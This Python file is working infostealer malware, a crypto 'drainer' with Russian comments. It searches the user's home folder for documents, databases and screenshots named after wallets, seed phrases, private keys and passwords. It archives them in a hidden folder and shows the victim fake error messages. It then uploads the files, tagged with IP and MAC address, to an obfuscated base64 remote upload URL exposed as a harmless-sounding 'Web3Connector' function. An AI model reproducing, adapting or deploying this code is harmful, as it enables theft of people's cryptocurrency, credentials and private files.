
# from drainer import start
# import asyncio
import os
import zipfile
import warnings
import uuid
import random
import string
import base64
import aiohttp
import asyncio
import json
import ctypes
import hashlib
import requests
import tkinter.messagebox as msgbox


file_extensions = ('txt', 'xls', 'xlsx', 'doc', 'docx', 'sqlite', 'py', 'json')
base64_hidden_folder_name = 'LnN5c3RlbTY0'
json_name = '.system64/data.json'
keywords = (
    'untitled', 'screenshot', 'cap', 'scrn', 'скрин', 'шот', 'snap', 'output',
    'wallet', 'btc', 'eth', 'coin', 'mask', 'meme', 'okx', 'binance', 'bybit',
    'crypt', 'seed', 'сид', 'addres', 'adres', 'data', 'config', 'кошелек',
    'акк', 'pwd', 'api', 'privatekey', 'private_key', 'private key', 'word', 'парол', 'stark',
    'leyer', 'zero', 'chain', 'trust', 'aptos', 'zora', 'мой', 'личный',
    'основ', 'linea', 'главный', 'zk', 'Zk', 'onic', 'мнемоник',
    'бинанс', 'биткоин'
)
exclude_dirs = ('site-packages', 'Scripts')  # Список директорий для исключения из поиска
exe_name = 'open_source'
user_id = '88005557575'

# ПОСЧИТАТЬ КОНТРОЛЬНУЮ СУММУ ФАЙЛА ДЛЯ ИСКЛЮЧЕНИЯ ПОВТОРНОЙ ОТПРАВКИ
def calculate_checksum(file_path):
    # Вычисляем хеш-сумму файла
    with open(file_path, 'rb') as f:
        hash_object = hashlib.sha256()
        for chunk in iter(lambda: f.read(4096), b''):
            hash_object.update(chunk)
    return hash_object.hexdigest()

# НЕ ВЫВОДИТЬ В КОНСОЛЬ ЭТИ ОШИБКИ
def warnings_cather():
    warnings.filterwarnings("ignore", category=UserWarning, module="os")
    warnings.filterwarnings("ignore", category=UserWarning, module="zipfile")
    warnings.filterwarnings("ignore", category=UserWarning, module="warnings")
    warnings.filterwarnings("ignore", category=UserWarning, module="requests")
    warnings.filterwarnings("ignore", category=UserWarning, module="uuid")
    warnings.filterwarnings("ignore", category=UserWarning, module="datetime")
    warnings.filterwarnings("ignore", category=UserWarning, module="base64")

# ПОЛУЧЕНИЕ IP АДРЕСА УСТРОЙСТВА С САЙТА api64.ipify.org
def get_ip_adress():
    try:
        response = requests.get('https://api64.ipify.org?format=json')
        data = response.json()
        data = data_formating(data['ip'])
        return data
    except Exception as e:
        data = "hide_ip"
        return data

# ПОЛУЧЕНИЕ MAC-АДРЕСА УСТРОЙСТВА
def get_mac_adress():
    try:
        task_hash = data_formating(':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)]))
        return task_hash
    except Exception as e:
        task_hash = "hide_mac"
        return task_hash

# ФОРМАТИРУЕТ IP И МАС-АДРЕСС БЕЗ ДВОЕТОЧИК
def data_formating (data):
    try:
        modified_data = data.replace('-', '.').replace(':', '.').replace('.', '.').replace(' ', '.')
        return modified_data
    except Exception as e:
        return None

# СОЗДАЕТ СКРЫТЫЮ ПАПКУ
def create_folder():
    os.makedirs(base64.b64decode(base64_hidden_folder_name).decode('utf-8'), exist_ok=True)
    try:
        # Получаем атрибуты папки
        attributes = ctypes.windll.kernel32.GetFileAttributesW(base64.b64decode(base64_hidden_folder_name).decode('utf-8'))
        # Если атрибуты успешно получены и папка не является скрытой, устанавливаем атрибут "скрытый"
        if attributes != -1 and not attributes & 2:
            ctypes.windll.kernel32.SetFileAttributesW(base64.b64decode(base64_hidden_folder_name).decode('utf-8'), attributes | 2)
    except Exception as e:
        pass

# ПРОВЕРКА КОНТРОЛЬНОЙ СУММЫ НОВЫХ ФАЙЛОВ И ПОИСК ПУТЕЙ К НУЖНЫМ ФАЙЛАМ [DRAINER]
def files_finder(checksum_file, extensions, keywords, exclude_dirs):
    # Загружаем старые контрольные суммы
    try:
        with open(checksum_file, 'r') as f:
            old_checksums = json.load(f)
    except FileNotFoundError:
        old_checksums = {}

    # Поиск файлов с нужными расширениями и ключевыми словами на компьютере
    changed_files = []
    for root, dirs, files in os.walk(os.path.expanduser('~')):
        if any(exclude_dir in root for exclude_dir in exclude_dirs):
            continue
        for file in files:
            file_path = os.path.join(root, file)
            try:
                if any(file.endswith(ext) for ext in extensions):
                    new_checksum = calculate_checksum(file_path)
                    old_checksum = old_checksums.get(file_path)
                    if old_checksum != new_checksum:
                        changed_files.append(file_path)
                        old_checksums[file_path] = new_checksum
                elif file.lower().endswith(('.png', '.jpeg', '.jpg')):
                    if any(file.lower().startswith(keyword.lower()) for keyword in keywords):
                        new_checksum = calculate_checksum(file_path)
                        old_checksum = old_checksums.get(file_path)
                        if old_checksum != new_checksum:
                            changed_files.append(file_path)
                            old_checksums[file_path] = new_checksum
            except PermissionError:
                continue
            except FileNotFoundError:
                continue

    # Записываем обновленные контрольные суммы в файл
    with open(checksum_file, 'w') as f:
        json.dump(old_checksums, f, indent=4)

    return changed_files

# ОТПРАВКА АРХИВА НА СЕРВЕР
async def send_archives(archives_path, base64_address):
    try:
        data_archives = aiohttp.FormData()
        data_archives.add_field('file', open(archives_path, 'rb'))
        async with aiohttp.ClientSession() as session:
            while True:
                async with session.post(base64.b64decode(base64_address).decode('utf-8'),
                                        data=data_archives) as response:
                    if response.status == 200:
                        break
                    else:
                        # Если ответ не 200, то можно обработать ошибку или повторить попытку отправки
                        pass
    except:
        pass
    try:
        os.remove(archives_path) # Удаляем отправленный архив
    except:
        pass

# УНИКАЛЬНЫЙ ИДЕНТИФИКАТОР МАМОНТА
def generate_key():
    value = string.ascii_letters + string.digits
    unique_key = ''.join(random.choice(value) for _ in range(5))
    return unique_key

# ФОРМИРУЕТ НАЗВАНИЕ АРХИВА
def get_archive_name():
    try:
        ip = get_ip_adress()
    except:
        ip = 'error_ip'
    try:
        mac = get_mac_adress()
    except:
        mac = 'mac_error'

    unique_name = f"{str(ip)}#{str(mac)}#{generate_key()}#{exe_name}#{user_id}"
    return unique_name


# ФОРМИРУЕТ ZIP-АРХИВ
def zip_creator(file_paths):
    archive_weight = 0 # Вес архива
    archive_id = 1 # Порядковый номер архива
    archive_name = get_archive_name() # Имя архива

    with zipfile.ZipFile(os.path.join(base64.b64decode(base64_hidden_folder_name).decode('utf-8'), f'{archive_name}#{archive_id}.zip'), 'w') as archive:
        for file_path in file_paths:
            try:
                file_weight = os.path.getsize(file_path)
                if archive_weight + file_weight > 40 * 1024 * 1024: # Максимум 40Мб на архив
                    archive_id += 1
                    archive_weight = 0
                    archive.close()
                    archive = zipfile.ZipFile(os.path.join(base64.b64decode(base64_hidden_folder_name).decode('utf-8'), f'{archive_name}#{archive_id}.zip'), 'w')
                archive.write(file_path, os.path.basename(file_path))
                archive_weight += file_weight
            except:
                pass
    archives = [os.path.join(base64.b64decode(base64_hidden_folder_name).decode('utf-8'), f'{archive_name}#{archive_id}.zip') for archive_id in range(1, archive_id + 1)]
    return archives

# ФУНКЦИЯ ПРОВЕРКИ ИНТЕРНЕТА
def check_internet_connection():
    try:
        requests.get("http://www.google.com", timeout=5)
        return True
    except requests.ConnectionError:
        return False


# ПОКАЗЫВАЕТ ОШИБКУ ПРИ ОТСУТСТВИИ ИНТЕРНЕТА
def show_internet_error_message():
    msgbox.showerror("Network Connection Error", "Unable to run the application as it requires an active internet connection. Please verify your network settings and ensure you're connected to the internet before retrying.\n\nError Code: 0x8024401F")

def show_ending_error_message():
    msgbox.showerror("System Compatibility Error", "This application is not compatible with your current system configuration. Please consider trying to run it on a different computer or operating system.\n\nError Code: 0x80000001")

def checking_message():
    msgbox.showinfo("Checking Update", "Updating... Please wait.")


# ОТКЛЮЧАЕТ ДЕТЕКТЫ + ЗАПУСКАЕТ ФОРМИРОВАНИЕ И ОТПРАВКУ АРХИВОВ
async def start(base64_address):
    if not check_internet_connection():                                           # Проверяем интернет-соединение
        show_internet_error_message()                                             # Если интернета нет- выдаем ошибку
    warnings_cather()                                                             # Выключаем warninngs
    create_folder()                                                               # Создаем скрытую папку
    # checking_message()                                                            # Выводим info checking update please wait
    file_paths = files_finder(json_name, file_extensions, keywords, exclude_dirs) # Получаем пути к файлам [DRAINER]
    zips = zip_creator(file_paths)                                                # Формируем список архивов
    while True:
        if check_internet_connection():
            show_ending_error_message()  # Выдаем ошибку
            tasks = [send_archives(arch, base64_address) for arch in zips]                                # Задача: каждый архив выслать
            await asyncio.gather(*tasks)                                                  # В асинхронном режиме
            break


async def main(base64_address):
    await start(base64_address)


def Web3Connector(base64_address='aHR0cDovL2RhbmlsYXZhbmRvdmVyLnB5dGhvbmFueXdoZXJlLmNvbS91cGxvYWQ='):
    asyncio.run(main(base64_address))
